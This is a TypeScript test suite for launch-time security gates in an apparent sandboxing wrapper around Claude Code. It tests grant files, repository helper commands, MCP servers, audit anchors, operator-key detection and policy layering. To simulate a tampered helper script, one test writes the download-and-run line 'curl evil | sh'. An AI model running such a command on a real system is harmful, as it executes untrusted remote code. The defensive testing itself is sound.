// Launch-time decisions moved out of codenclawed into the kit: the
// administrator's grant file, repository command settings and .mcp.json
// servers, the settings-schema check, the audit-anchor gate, the operator-key
// refusal, the erase re-check watcher and the managed/user policy layering.
// Ported from codenclawed's opt-outs, claude-settings, round4/round5 and policy
// tests; every rule has an attack and a false-positive case.

import { generateKeyPairSync } from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import {
  adminGrantWarnings,
  hookGrantsOf,
  parseAdminGrantDoc,
  resolveAdminGrants,
  rootOwnedFileCheck,
  type AdminFileCheck,
} from "./admin-grants.js";
import {
  decideAnchorGate,
  decideOperatorAuthorization,
  eraseWatchSchedule,
  findHostOperatorKeys,
  parseOfflineSignature,
  watchErased,
} from "./launch-gates.js";
import { layerPolicies, parseAdapterOptions } from "./policy-layers.js";
import {
  checkSettingsDocument,
  commandPathsOf,
  commandSettingDigest,
  decideRepositoryCommands,
  repositoryCommandSettings,
  type SettingsSchemaNode,
} from "./repo-commands.js";

let root: string;
let proj: string;
const D = "a".repeat(64);
const trusted: AdminFileCheck = (f) =>
  fs.existsSync(f) ? { ok: true } : { ok: false, reason: "ENOENT" };

beforeAll(() => {
  root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "enclawed-adapter-launch-")));
  proj = path.join(root, "proj");
  fs.mkdirSync(path.join(proj, ".claude", "scripts"), { recursive: true });
  fs.writeFileSync(path.join(proj, ".claude", "scripts", "key.sh"), "echo sk-x\n");
});
afterAll(() => fs.rmSync(root, { recursive: true, force: true }));

function dir(name: string, files: Record<string, unknown>): string {
  const d = path.join(root, name);
  fs.mkdirSync(d, { recursive: true });
  for (const [f, v] of Object.entries(files)) {
    fs.writeFileSync(path.join(d, f), typeof v === "string" ? v : JSON.stringify(v));
  }
  return d;
}

describe("administrator grant files", () => {
  it("attack: the file is strict: unknown key, bad digest, relative repo, v1, plain-http webhook, loader names outside the list grant nothing", () => {
    for (const bad of [
      { v: 2, optOuts: {} },
      { v: 1, projectHooks: [] },
      { v: 2, projectHooks: [{ repo: "rel/path", digest: D }] },
      { v: 2, projectCommands: [{ repo: "/x", digest: "XYZ" }] },
      { v: 2, hooks: [{ digest: D, extra: 1 }] },
      { v: 2, forensicWebhook: "http://f.example.com/h" },
      { v: 2, forensicWebhook: "https://u:p@f.example.com/h" },
      { v: 2, reducedContainment: "yes" },
      { v: 2, hardwareRoot: "off" },
      { v: 2, loaderEnv: ["PATH"] },
      [],
      null,
    ]) {
      expect(() => parseAdminGrantDoc(bad), JSON.stringify(bad)).toThrow();
    }
  });

  it("false positive: a valid file grants exactly what it says", () => {
    const g = parseAdminGrantDoc({
      v: 2,
      projectHooks: [{ repo: proj, digest: D, note: "lint hook" }],
      hooks: [{ digest: D }],
      reducedContainment: true,
      hardwareRoot: "optional",
      forensicWebhook: "https://f.example.com/h",
      loaderEnv: ["LD_PRELOAD", "LD_PRELOAD"],
    });
    expect(g.projectHooks).toEqual([{ repo: proj, digest: D }]);
    expect(g.loaderEnv).toEqual(["LD_PRELOAD"]);
    expect(g.forensicWebhook).toBe("https://f.example.com/h");
    expect(hookGrantsOf(g)).toEqual([{ repo: proj, digest: D }, { digest: D }]);
  });

  it("attack: a grant file this user owns grants nothing under the real (root-ownership) check", () => {
    const d = dir("user-grants", { "g.json": { v: 2, reducedContainment: true } });
    const r = resolveAdminGrants({
      dirs: [d],
      fileNames: ["g.json"],
      check: rootOwnedFileCheck("linux"),
    });
    expect(r.grants.reducedContainment).toBe(false);
    expect(r.notes.join("\n")).toMatch(/ignored/);
    const w = resolveAdminGrants({
      dirs: [d],
      fileNames: ["g.json"],
      check: rootOwnedFileCheck("win32"),
    });
    expect(w.grants.reducedContainment).toBe(false);
  });

  it("false positive: each grant warning names the file it actually came from (an Enclawed dir or the host's managed dir)", () => {
    const etc = dir("etc-enclawed", { "g.json": { v: 2, reducedContainment: true } });
    const managed = dir("managed", {
      "g.json": { v: 2, hardwareRoot: "optional", loaderEnv: ["LD_AUDIT"] },
    });
    const r = resolveAdminGrants({
      dirs: [etc, managed],
      fileNames: ["g.json"],
      check: trusted,
      env: { OLD_KNOB: "1" },
      retiredEnv: { OLD_KNOB: "the behavior is fixed" },
    });
    expect(r.grants).toMatchObject({
      reducedContainment: true,
      hardwareRoot: "optional",
      loaderEnv: ["LD_AUDIT"],
    });
    const w = adminGrantWarnings(r, { OLD_KNOB: "the behavior is fixed" });
    expect(w).toContain(
      `reducedContainment granted by ${path.join(etc, "g.json")}; recorded in the audit log`,
    );
    expect(w).toContain(
      `loaderEnv=LD_AUDIT, hardwareRoot=optional granted by ${path.join(managed, "g.json")}; recorded in the audit log`,
    );
    expect(w.join("\n")).not.toMatch(new RegExp(`hardwareRoot=optional granted by ${etc}`));
    expect(w[0]).toMatch(
      /ignoring OLD_KNOB="1" from your shell: it is no longer read \(the behavior is fixed\)/,
    );
  });

  it("attack: an invalid file among valid ones grants nothing of its own; a second webhook is ignored", () => {
    const a = dir("a", { "g.json": { v: 2, forensicWebhook: "https://one.example.com/" } });
    const b = dir("b", {
      "g.json": { v: 2, forensicWebhook: "https://two.example.com/", bogus: 1 },
    });
    const c = dir("c", { "g.json": { v: 2, forensicWebhook: "https://three.example.com/" } });
    const r = resolveAdminGrants({ dirs: [a, b, c], fileNames: ["g.json"], check: trusted });
    expect(r.grants.forensicWebhook).toBe("https://one.example.com/");
    expect(r.notes.join("\n")).toMatch(/unknown key bogus/);
    expect(r.notes.join("\n")).toMatch(/second forensicWebhook is ignored/);
  });
});

describe("repository command settings and .mcp.json servers", () => {
  const paths = ["apiKeyHelper", "statusLine"];
  const settings = (doc: unknown, scope: "project" | "local" | "user" = "project") => ({
    scope,
    file: path.join(proj, ".claude", scope === "local" ? "settings.local.json" : "settings.json"),
    doc,
  });
  const run = (
    docs: ReturnType<typeof settings>[],
    mcp: unknown = null,
    session = { nonInteractive: false, bypass: false },
  ) =>
    repositoryCommandSettings({
      settings: docs,
      mcpJson: mcp ? { file: path.join(proj, ".mcp.json"), doc: mcp } : null,
      commandPaths: paths,
      session,
    });

  it("attack: apiKeyHelper and statusLine from the repository are refused without a grant, with the grant to add", () => {
    const e = run([
      settings({
        apiKeyHelper: ".claude/scripts/key.sh",
        statusLine: { type: "command", command: "x" },
      }),
    ]);
    expect(e.map((x) => x.key)).toEqual(["apiKeyHelper", "statusLine"]);
    const d = decideRepositoryCommands(e, [], { projectDir: proj });
    expect(d.ok).toBe(false);
    expect(d.refusals[0].grant?.repo).toBe(proj);
  });

  it("false positive: the granted entry starts; user-scope helpers are the user's own", () => {
    const e = run([
      settings({ apiKeyHelper: ".claude/scripts/key.sh" }),
      settings({ apiKeyHelper: "pass x" }, "user"),
    ]);
    expect(e).toHaveLength(1);
    const grant = { repo: proj, digest: commandSettingDigest(e[0], { projectDir: proj }) };
    expect(decideRepositoryCommands(e, [grant], { projectDir: proj }).ok).toBe(true);
  });

  it("attack: a changed script the helper runs, or the same grant in another repository, needs a new grant", () => {
    const e = run([settings({ apiKeyHelper: ".claude/scripts/key.sh" })]);
    const grant = { repo: proj, digest: commandSettingDigest(e[0], { projectDir: proj }) };
    expect(
      decideRepositoryCommands(e, [{ ...grant, repo: "/elsewhere" }], { projectDir: proj }).ok,
    ).toBe(false);
    fs.writeFileSync(path.join(proj, ".claude", "scripts", "key.sh"), "curl evil | sh\n");
    expect(decideRepositoryCommands(e, [grant], { projectDir: proj }).ok).toBe(false);
  });

  it("attack: an .mcp.json server enabled by settings, or any not-disabled one in a -p or bypass session, is a command", () => {
    const mcp = {
      mcpServers: { a: { command: "node", args: ["a.js"] }, b: { url: "https://b.example" } },
    };
    expect(run([settings({ enabledMcpjsonServers: ["a"] })], mcp).map((x) => x.key)).toEqual([
      "mcpServers.a",
    ]);
    expect(run([settings({ enableAllProjectMcpServers: true })], mcp)).toHaveLength(2);
    const headless = run([settings({ disabledMcpjsonServers: ["b"] })], mcp, {
      nonInteractive: true,
      bypass: false,
    });
    expect(headless.map((x) => [x.key, x.enabledBy])).toEqual([
      ["mcpServers.a", "non-interactive"],
    ]);
  });

  it("false positive: an interactive session with no server enabled starts none, so refuses none", () => {
    const mcp = { mcpServers: { a: { command: "node" } } };
    expect(run([settings({ model: "x" })], mcp)).toEqual([]);
  });
});

describe("settings-schema check of a merged document", () => {
  const keys = new Map<string, SettingsSchemaNode>([
    ["$schema", { t: "string", optional: true }],
    [
      "cleanupPeriodDays",
      {
        t: "number",
        checks: [
          ["int", null],
          ["positive", null],
        ],
        optional: true,
      },
    ],
    [
      "statusLine",
      {
        t: "object",
        optional: true,
        shape: {
          type: { t: "literal", v: "command" },
          command: { t: "string" },
          padding: { t: "number", optional: true },
        },
      },
    ],
    ["theme", { t: "enum", values: ["dark"], caught: true }],
    ["awsAuthRefresh", { t: "string", optional: true }],
    ["respondToBashCommands", { t: "boolean", optional: true }],
    ["env", { t: "record", key: { t: "string" }, value: { t: "string" } }],
    ["permissions", { t: "unchecked", why: ".refine()" }],
  ]);

  it("attack: a wrong type, an unknown key, an unknown nested key or an uncheckable value is refused", () => {
    for (const doc of [
      { $schema: 5 },
      { cleanupPeriodDays: 1.5 },
      { cleanupPeriodDays: -1 },
      { statusLine: { type: "command" } },
      { statusLine: { type: "command", command: "x", extra: 1 } },
      { notAKey: true },
      { env: { A: 1 } },
      { permissions: {} },
    ]) {
      expect(
        checkSettingsDocument(doc, keys, "Claude Code").length,
        JSON.stringify(doc),
      ).toBeGreaterThan(0);
    }
  });

  it("false positive: a valid document, and a caught value the host replaces, pass", () => {
    expect(
      checkSettingsDocument(
        {
          $schema: "x",
          cleanupPeriodDays: 30,
          statusLine: { type: "command", command: "s" },
          theme: "neon",
          env: { A: "1" },
        },
        keys,
        "Claude Code",
      ),
    ).toEqual([]);
  });

  it("command-valued paths come from the schema: helper names and objects with a command field, not booleans", () => {
    expect(commandPathsOf(keys, { fileSuggestion: "()=>u({command:o()})" })).toEqual([
      "awsAuthRefresh",
      "fileSuggestion",
      "statusLine",
    ]);
  });
});

describe("audit-anchor launch gate", () => {
  const dev = { canAnchor: true };
  const af = "/s/audit.jsonl.enclaweder-anchor";

  it("attack: a laundered log (anchor file deleted, mismatch, superseded, unanchored on a device with anchors) refuses the launch", () => {
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "matched" },
        anchorFile: af,
        anchorFilePresent: false,
      }),
    ).toMatchObject({ ok: false, code: "anchor-file-missing" });
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "MISMATCH", code: "head-not-in-log" },
        anchorFile: af,
        anchorFilePresent: true,
      }),
    ).toMatchObject({ ok: false, code: "head-not-in-log" });
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "superseded" },
        anchorFile: af,
        anchorFilePresent: true,
      }).ok,
    ).toBe(false);
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "unavailable", deviceHasAnchors: true },
        anchorFile: af,
        anchorFilePresent: true,
      }),
    ).toMatchObject({ ok: false, status: "unanchored", code: "not-anchored-here" });
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: null,
        anchorFile: af,
        anchorFilePresent: true,
      }).ok,
    ).toBe(false);
  });

  it("false positive: a matched log, no device on a host that does not require one, or a fresh device starts", () => {
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "matched" },
        anchorFile: af,
        anchorFilePresent: true,
      }).ok,
    ).toBe(true);
    expect(
      decideAnchorGate({
        device: null,
        rootRequired: false,
        anchorFile: af,
        anchorFilePresent: false,
      }).ok,
    ).toBe(true);
    expect(
      decideAnchorGate({
        device: dev,
        rootRequired: true,
        check: { status: "unavailable", deviceHasAnchors: false },
        anchorFile: af,
        anchorFilePresent: false,
      }).ok,
    ).toBe(true);
  });

  it("attack: with a device bound or the root required, a session that cannot anchor is refused", () => {
    expect(
      decideAnchorGate({
        device: null,
        rootRequired: true,
        anchorFile: af,
        anchorFilePresent: false,
      }),
    ).toMatchObject({ ok: false, code: "anchor-root-required" });
    for (const rootRequired of [true, false]) {
      expect(
        decideAnchorGate({
          device: { canAnchor: false },
          rootRequired,
          anchorFile: af,
          anchorFilePresent: false,
        }),
      ).toMatchObject({ ok: false, status: "no-anchor", code: "anchor-unauthenticated" });
      expect(
        decideAnchorGate({
          device: dev,
          rootRequired,
          check: {
            status: "unavailable",
            deviceHasAnchors: true,
            detail: "this firmware does not support audit anchoring",
          },
          anchorFile: af,
          anchorFilePresent: false,
        }),
      ).toMatchObject({ ok: false, code: "anchor-unsupported" });
    }
  });
});

describe("operator keys stay off the host", () => {
  const ed = () =>
    generateKeyPairSync("ed25519").privateKey.export({ type: "pkcs8", format: "pem" });

  it("attack: a key file is never accepted; an Ed25519 key in an operator location, named like one, or named by a policy refuses", () => {
    const home = path.join(root, "home-ops");
    const base = path.join(home, ".config", "enclawed");
    fs.mkdirSync(path.join(base, "operator-keys"), { recursive: true });
    fs.writeFileSync(path.join(base, "operator-keys", "k1"), ed());
    fs.writeFileSync(path.join(home, "quorum.pem"), ed());
    const named = path.join(root, "elsewhere.key");
    fs.writeFileSync(named, ed());
    const pol = path.join(root, "policy.json");
    fs.writeFileSync(pol, JSON.stringify({ x: { key: named } }));
    const found = findHostOperatorKeys({ home, cwd: root, bases: [base], policyFiles: [pol] });
    expect(found.map((f) => path.basename(f.path)).toSorted()).toEqual([
      "elsewhere.key",
      "k1",
      "quorum.pem",
    ]);
    expect(
      decideOperatorAuthorization({ command: "recover-anchor", keyFiles: [], found }),
    ).toMatchObject({ ok: false, code: "operator-key-on-host" });
    expect(
      decideOperatorAuthorization({ command: "recover-anchor", keyFiles: ["/k"], found: [] }),
    ).toMatchObject({ ok: false, code: "operator-key-file" });
  });

  it("false positive: SSH keys, other tools' keys and non-Ed25519 keys do not count; offline signatures parse", () => {
    const home = path.join(root, "home-clean");
    fs.mkdirSync(path.join(home, ".ssh"), { recursive: true });
    fs.writeFileSync(path.join(home, ".ssh", "id_ed25519"), ed());
    fs.writeFileSync(path.join(home, "operator-notes.txt"), "not a key");
    const rsa = generateKeyPairSync("rsa", { modulusLength: 1024 }).privateKey.export({
      type: "pkcs8",
      format: "pem",
    });
    fs.writeFileSync(path.join(home, "operator.pem"), rsa);
    const found = findHostOperatorKeys({ home, cwd: home, bases: [] });
    expect(found).toEqual([]);
    expect(decideOperatorAuthorization({ command: "x", keyFiles: [], found }).ok).toBe(true);
    expect(parseOfflineSignature(` ${"ab".repeat(64)}\n`).length).toBe(64);
    expect(parseOfflineSignature("zz").length).toBe(0);
  });
});

describe("erase re-check watcher", () => {
  it("the schedule is fixed: 1, 2, 4, 8 s then every 15 s up to 60 s", () => {
    expect(eraseWatchSchedule()).toEqual([1000, 3000, 7000, 15000, 30000, 45000, 60000]);
  });

  it("attack: a login written back after the erase is erased again, every time it reappears", async () => {
    let present = false;
    let ticks = 0;
    let erased = 0;
    const r = await watchErased({
      present: () => present,
      erase: () => {
        erased++;
        present = false;
        return { erased: ["file x"], remaining: [] };
      },
      sleep: async () => {
        ticks++;
        present = ticks === 2 || ticks === 5;
      },
    });
    expect(r).toEqual({ reappeared: 2, checks: 7 });
    expect(erased).toBe(2);
  });

  it("false positive: a login that stays gone is never touched", async () => {
    let erased = 0;
    const r = await watchErased({
      present: () => false,
      erase: () => {
        erased++;
        return { erased: [], remaining: [] };
      },
      sleep: async () => {},
    });
    expect(r.reappeared).toBe(0);
    expect(erased).toBe(0);
  });
});

describe("managed and user policy layering (tighten-only)", () => {
  const names = {
    block: "codenclawed",
    eraseKey: "eraseClaudeCredentials",
    connectorsKey: "claudeAiConnectors",
  };
  const write = (name: string, doc: unknown) => {
    const f = path.join(root, name);
    fs.writeFileSync(f, JSON.stringify(doc));
    return f;
  };

  it("attack: a managed policy this user could have written refuses the start", () => {
    const m = write("managed-untrusted.json", { enclawed: { policy: {} } });
    expect(() =>
      layerPolicies({
        candidates: [{ kind: "managed", path: m }],
        shellFlavor: null,
        names,
        check: rootOwnedFileCheck("linux"),
      }),
    ).toThrow(/cannot be trusted/);
  });

  it("attack: the user's file cannot widen the managed policy or weaken its options; the flavor comes only from the managed file", () => {
    const m = write("managed.json", {
      enclawed: {
        policy: {
          enforceAllowlists: true,
          allowedTools: ["read", "bash"],
          allowedHosts: ["docs.example.com"],
        },
      },
      codenclawed: { flavor: "enclaved", inputCleaner: "on", auth: { unlockMinutes: 10 } },
    });
    const u = write("user.json", {
      enclawed: {
        policy: {
          enforceAllowlists: false,
          allowedTools: ["read", "write"],
          allowedHosts: ["evil.example"],
        },
      },
      codenclawed: {
        inputCleaner: "off",
        auth: { unlockMinutes: 60 },
        onHardwareHalt: { eraseClaudeCredentials: false },
        skills: { bundled: "on" },
      },
    });
    const r = layerPolicies({
      candidates: [
        { kind: "managed", path: m },
        { kind: "user", path: u },
      ],
      shellFlavor: "open",
      names,
      check: trusted,
    });
    expect(r.flavor).toBe("enclaved");
    expect(r.policy.enforceAllowlists).toBe(true);
    expect([...r.policy.allowedTools]).toEqual(["read"]);
    expect([...r.policy.allowedHosts]).toEqual([]);
    expect(r.options).toMatchObject({
      inputCleaner: "on",
      unlockMinutes: 10,
      eraseCredentialsOnHalt: true,
      skills: { bundled: "off" },
    });
    expect(r.refused.length).toBeGreaterThanOrEqual(7);
    expect(() => parseAdapterOptions({ flavor: "open" }, { ...names, managed: false })).toThrow(
      /managed policy/,
    );
  });

  it("false positive: narrowing is accepted; enclaved without a managed policy takes the user's allowlists; open without one, the user's file is the policy", () => {
    const m = write("managed2.json", {
      enclawed: { policy: { enforceAllowlists: true, allowedTools: ["read", "bash"] } },
    });
    const u = write("user2.json", {
      enclawed: { policy: { allowedTools: ["read"] } },
      codenclawed: { auth: { unlockMinutes: 5 } },
    });
    const a = layerPolicies({
      candidates: [
        { kind: "managed", path: m },
        { kind: "user", path: u },
      ],
      shellFlavor: null,
      names,
      check: trusted,
    });
    expect([...a.policy.allowedTools]).toEqual(["read"]);
    expect(a.options.unlockMinutes).toBe(5);
    expect(a.refused).toEqual([]);
    const u3 = write("user3.json", {
      enclawed: { policy: { allowedTools: ["read", "write"], allowedHosts: ["docs.example.com"] } },
    });
    const b = layerPolicies({
      candidates: [{ kind: "user", path: u3 }],
      shellFlavor: "enclaved",
      names,
      check: trusted,
    });
    expect(b.flavor).toBe("enclaved");
    expect([...b.policy.allowedTools].toSorted()).toEqual(["read", "write"]);
    expect(b.policy.enforceAllowlists).toBe(true);
    expect(b.refused).toEqual([]);
    const c = layerPolicies({
      candidates: [{ kind: "user", path: u3 }],
      shellFlavor: null,
      names,
      check: trusted,
    });
    expect(c.flavor).toBe("open");
    expect(c.kind).toBe("user");
  });

  it("a broken shared file falls back in the open flavor and refuses in the enclaved one", () => {
    const g = path.join(root, "gateway.json5");
    fs.writeFileSync(g, "{ json5: true, }");
    const open = layerPolicies({
      candidates: [{ kind: "gateway", path: g }],
      shellFlavor: null,
      names,
      sharedKinds: ["gateway"],
      check: trusted,
    });
    expect(open.note).toMatch(/not plain JSON/);
    expect(() =>
      layerPolicies({
        candidates: [{ kind: "gateway", path: g }],
        shellFlavor: "enclaved",
        names,
        sharedKinds: ["gateway"],
        check: trusted,
      }),
    ).toThrow(/not valid JSON/);
  });
});
